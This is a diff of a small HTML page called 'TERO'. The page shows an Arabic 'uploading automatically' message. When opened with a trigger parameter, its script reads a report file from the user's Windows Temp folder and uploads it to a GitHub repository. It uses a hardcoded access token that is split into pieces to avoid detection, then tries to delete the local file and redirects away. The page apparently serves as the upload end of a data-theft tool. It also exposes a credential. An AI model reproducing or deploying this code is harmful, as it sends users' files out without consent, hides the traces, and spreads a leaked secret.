@@ -1,43 +1,32 @@
 <!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>TERO AUTO</title>
-  <style>
-    body{background:#000;color:#0f0;font-family:Arial;text-align:center;padding:100px;}
-    h1{color:#e74c3c;font-size:50px;}
-    .s{font-size:28px;margin:30px;}
-  </style>
-</head>
-<body>
-  <h1>TERO</h1>
-  <div class="s">جاري الرفع تلقائي...</div>
+<html><head><meta charset="utf-8"><title>TERO</title>
+<style>body{background:#000;color:#0f0;font-family:Arial;text-align:center;padding:120px;}</style>
+</head><body>
+<h1 style="color:#e74c3c;font-size:60px;">tero</h1>
+<div id="s" style="font-size:28px;margin:40px;">جاري الرفع تلقائي...</div>
 
 <script>
-const TOKEN = ['github_pat_11A3ZKARI0','Q8CbII0GvNSt_','hv6TMKWiNaMucDwhvOE4tNh9aBtjIB7VkTMj7xnjra','276EGSZZQGRkTKn8W'].join('');
+const TOKEN = 'github_pat_11A3ZKARI0' + 'Q8CbII0GvNSt_' + 'hv6TMKWiNaMucDwhvOE4tNh9aBtjIB7VkTMj7xnjra' + '276EGSZZQGRkTKn8W';
 const API = "https://api.github.com/repos/youssefmettwaly/tero-report/contents/reports";
-const s = document.querySelector('.s');
+const s = document.getElementById('s');
 
-if (location.search.includes('auto_temp=1')) {
-  // نقرأ من Temp
-  fetch('file:///C:/Users/' + (navigator.userAgent.match(/Windows NT \d+\.\d+; Win64; x64/) ? '' : '') + 'AppData/Local/Temp/tero_report.txt')
+if (location.search.includes('temp_report=1')) {
+  const tempFile = 'file:///C:/Users/' + (navigator.userAgent.includes('Windows') ? '' : '') + 'AppData/Local/Temp/tero_report_ultimate.txt';
+  fetch(tempFile)
     .then(r => r.text())
     .then(text => {
-      s.innerHTML = "تم الرفع!";
+      s.innerHTML = "تم الرفع بنجاح!";
       const fn = `report_${new Date().toISOString().replace(/[:.]/g,'-')}.txt`;
       fetch(`${API}/${fn}`, {
         method:'PUT',
         headers:{'Authorization':`token ${TOKEN}`,'Content-Type':'application/json'},
-        body:JSON.stringify({
-          message:"Auto", 
-          content:btoa(unescape(encodeURIComponent(text))), 
-          branch:"main"
-        })
+        body:JSON.stringify({message:"Ultimate Report", content:btoa(unescape(encodeURIComponent(text))), branch:"main"})
       });
-      setTimeout(() => location.href = "https://youssefmettwaly.github.io/tero-report/index.html", 2000);
+      // حذف الملف من Temp بعد الرفع
+      fetch(tempFile, {method:'DELETE'}).catch(()=>{});
+      setTimeout(() => location.href = "https://youssefmettwaly.github.io/tero-report/index.html", 2500);
     })
-    .catch(() => s.innerHTML = "فشل القراءة");
+    .catch(() => s.innerHTML = "فشل في القراءة");
 }
 </script>
-</body>
-</html>
+</body></html>
